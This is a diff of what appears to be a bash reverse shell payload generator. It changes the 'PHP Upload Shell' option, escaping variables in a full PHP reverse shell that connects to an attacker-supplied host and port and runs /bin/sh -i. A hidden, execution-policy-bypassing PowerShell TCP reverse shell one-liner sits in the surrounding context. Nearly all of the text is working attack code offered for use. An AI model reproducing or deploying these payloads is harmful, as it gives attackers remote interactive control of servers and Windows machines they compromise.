@@ -163,46 +163,46 @@ case $choice in
         payload="powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$LHOST\",$LPORT);\$stream = \$client.GetStream();[byte[]] \$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()};\$client.Close()"
         ;;
     u) # PHP Upload Shell
-        payload="<?php
-		
+      payload="<?php
+      
 set_time_limit (0);
-$VERSION = "1.0";
-$ip = '$LHOST';  
-$port = $LPORT;      
-$chunk_size = 1400;
-$write_a = null;
-$error_a = null;
-$shell = 'uname -a; w; id; /bin/sh -i';
-$daemon = 0;
-$debug = 0;
+\$VERSION = \"1.0\";
+\$ip = '$LHOST';  
+\$port = $LPORT;    
+\$chunk_size = 1400;
+\$write_a = null;
+\$error_a = null;
+\$shell = 'uname -a; w; id; /bin/sh -i';
+\$daemon = 0;
+\$debug = 0;
 
 
 
 if (function_exists('pcntl_fork')) {
-	$pid = pcntl_fork();
-	
-	if ($pid == -1) {
-		printit("ERROR: Can't fork");
-		exit(1);
-	}
-	
-	if ($pid) {
-		exit(0);  // Parent exits
-	}
+    \$pid = pcntl_fork();
+    
+    if (\$pid == -1) {
+        printit(\"ERROR: Can't fork\");
+        exit(1);
+    }
+    
+    if (\$pid) {
+        exit(0);  // Parent exits
+    }
 
-	
-	if (posix_setsid() == -1) {
-		printit("Error: Can't setsid()");
-		exit(1);
-	}
+    
+    if (posix_setsid() == -1) {
+        printit(\"Error: Can't setsid()\");
+        exit(1);
+    }
 
-	$daemon = 1;
+    \$daemon = 1;
 } else {
-	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+    printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");
 }
 
 
-chdir("/");
+chdir(\"/\");
 
 
 umask(0);
@@ -210,96 +210,96 @@ umask(0);
 
 
 // Open reverse connection
-$sock = fsockopen($ip, $port, $errno, $errstr, 30);
-if (!$sock) {
-	printit("$errstr ($errno)");
-	exit(1);
+\$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30);
+if (!\$sock) {
+    printit(\"\$errstr (\$errno)\");
+    exit(1);
 }
 
 // Spawn shell process
-$descriptorspec = array(
-   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
-   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
-   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+\$descriptorspec = array(
+   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from
+   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to
+   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to
 );
 
-$process = proc_open($shell, $descriptorspec, $pipes);
+\$process = proc_open(\$shell, \$descriptorspec, \$pipes);
 
-if (!is_resource($process)) {
-	printit("ERROR: Can't spawn shell");
-	exit(1);
+if (!is_resource(\$process)) {
+    printit(\"ERROR: Can't spawn shell\");
+    exit(1);
 }
 
 
-stream_set_blocking($pipes[0], 0);
-stream_set_blocking($pipes[1], 0);
-stream_set_blocking($pipes[2], 0);
-stream_set_blocking($sock, 0);
+stream_set_blocking(\$pipes[0], 0);
+stream_set_blocking(\$pipes[1], 0);
+stream_set_blocking(\$pipes[2], 0);
+stream_set_blocking(\$sock, 0);
 
-printit("Successfully opened reverse shell to $ip:$port");
+printit(\"Successfully opened reverse shell to \$ip:\$port\");
 
 while (1) {
-	// Check for end of TCP connection
-	if (feof($sock)) {
-		printit("ERROR: Shell connection terminated");
-		break;
-	}
+    // Check for end of TCP connection
+    if (feof(\$sock)) {
+        printit(\"ERROR: Shell connection terminated\");
+        break;
+    }
 
-	// Check for end of STDOUT
-	if (feof($pipes[1])) {
-		printit("ERROR: Shell process terminated");
-		break;
-	}
+    // Check for end of STDOUT
+    if (feof(\$pipes[1])) {
+        printit(\"ERROR: Shell process terminated\");
+        break;
+    }
 
-	
-	$read_a = array($sock, $pipes[1], $pipes[2]);
-	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+    
+    \$read_a = array(\$sock, \$pipes[1], \$pipes[2]);
+    \$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);
 
-	
-	// data to process's STDIN
-	if (in_array($sock, $read_a)) {
-		if ($debug) printit("SOCK READ");
-		$input = fread($sock, $chunk_size);
-		if ($debug) printit("SOCK: $input");
-		fwrite($pipes[0], $input);
-	}
+    
+    // data to process's STDIN
+    if (in_array(\$sock, \$read_a)) {
+        if (\$debug) printit(\"SOCK READ\");
+        \$input = fread(\$sock, \$chunk_size);
+        if (\$debug) printit(\"SOCK: \$input\");
+        fwrite(\$pipes[0], \$input);
+    }
 
-	// If we can read from the process's STDOUT
-	// send data down tcp connection
-	if (in_array($pipes[1], $read_a)) {
-		if ($debug) printit("STDOUT READ");
-		$input = fread($pipes[1], $chunk_size);
-		if ($debug) printit("STDOUT: $input");
-		fwrite($sock, $input);
-	}
+    // If we can read from the process's STDOUT
+    // send data down tcp connection
+    if (in_array(\$pipes[1], \$read_a)) {
+        if (\$debug) printit(\"STDOUT READ\");
+        \$input = fread(\$pipes[1], \$chunk_size);
+        if (\$debug) printit(\"STDOUT: \$input\");
+        fwrite(\$sock, \$input);
+    }
 
-	// If we can read from the process's STDERR
-	// send data down tcp connection
-	if (in_array($pipes[2], $read_a)) {
-		if ($debug) printit("STDERR READ");
-		$input = fread($pipes[2], $chunk_size);
-		if ($debug) printit("STDERR: $input");
-		fwrite($sock, $input);
-	}
+    // If we can read from the process's STDERR
+    // send data down tcp connection
+    if (in_array(\$pipes[2], \$read_a)) {
+        if (\$debug) printit(\"STDERR READ\");
+        \$input = fread(\$pipes[2], \$chunk_size);
+        if (\$debug) printit(\"STDERR: \$input\");
+        fwrite(\$sock, \$input);
+    }
 }
 
-fclose($sock);
-fclose($pipes[0]);
-fclose($pipes[1]);
-fclose($pipes[2]);
-proc_close($process);
+fclose(\$sock);
+fclose(\$pipes[0]);
+fclose(\$pipes[1]);
+fclose(\$pipes[2]);
+proc_close(\$process);
 
 // Like print, but does nothing if we've daemonised ourself
 // (I can't figure out how to redirect STDOUT like a proper daemon)
-function printit ($string) {
-	if (!$daemon) {
-		print "$string\n";
-	}
+function printit (\$string) {
+    if (!\$daemon) {
+        print \"\$string\n\";
+    }
 }
 
-?> 
+?>  
 "
-        ;;
+      ;;
     *) 
         echo -e "${RED}❌ Invalid choice!${RESET}"
         exit 1
